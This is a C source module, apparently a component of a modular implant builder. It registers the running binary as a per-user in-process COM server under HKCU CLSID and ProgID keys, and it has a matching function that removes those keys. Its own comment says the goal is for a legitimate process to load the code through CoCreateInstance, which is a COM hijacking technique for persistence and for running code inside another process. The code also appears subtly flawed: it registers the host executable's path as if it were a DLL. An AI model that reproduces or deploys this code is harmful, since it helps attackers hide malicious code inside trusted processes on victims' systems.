// chunk: process/com_object
// depends: (none)
// provides: register_com_server, unregister_com_server
// headers: windows.h
// note: Register as an in-proc COM server — legitimate process loads us via CoCreateInstance

#ifndef CHUNK_PROCESS_COM_OBJECT
#define CHUNK_PROCESS_COM_OBJECT

static int register_com_server(const char *clsid, const char *progid) {
    char dll_path[MAX_PATH];
    GetModuleFileNameA(NULL, dll_path, MAX_PATH);

    char key[512];
    HKEY hk;
    DWORD disp;

    snprintf(key, sizeof(key), "Software\\Classes\\CLSID\\%s\\InprocServer32", clsid);
    if (RegCreateKeyExA(HKEY_CURRENT_USER, key, 0, NULL,
                        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hk, &disp) != ERROR_SUCCESS)
        return 0;
    RegSetValueExA(hk, NULL, 0, REG_SZ, (BYTE *)dll_path, (DWORD)strlen(dll_path) + 1);
    RegSetValueExA(hk, "ThreadingModel", 0, REG_SZ, (BYTE *)"Both", 5);
    RegCloseKey(hk);

    if (progid && progid[0]) {
        snprintf(key, sizeof(key), "Software\\Classes\\%s\\CLSID", progid);
        if (RegCreateKeyExA(HKEY_CURRENT_USER, key, 0, NULL,
                            REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hk, &disp) == ERROR_SUCCESS) {
            RegSetValueExA(hk, NULL, 0, REG_SZ, (BYTE *)clsid, (DWORD)strlen(clsid) + 1);
            RegCloseKey(hk);
        }
    }
    return 1;
}

static void unregister_com_server(const char *clsid, const char *progid) {
    char key[512];
    snprintf(key, sizeof(key), "Software\\Classes\\CLSID\\%s\\InprocServer32", clsid);
    RegDeleteKeyA(HKEY_CURRENT_USER, key);
    snprintf(key, sizeof(key), "Software\\Classes\\CLSID\\%s", clsid);
    RegDeleteKeyA(HKEY_CURRENT_USER, key);
    if (progid && progid[0]) {
        snprintf(key, sizeof(key), "Software\\Classes\\%s\\CLSID", progid);
        RegDeleteKeyA(HKEY_CURRENT_USER, key);
        snprintf(key, sizeof(key), "Software\\Classes\\%s", progid);
        RegDeleteKeyA(HKEY_CURRENT_USER, key);
    }
}

#endif
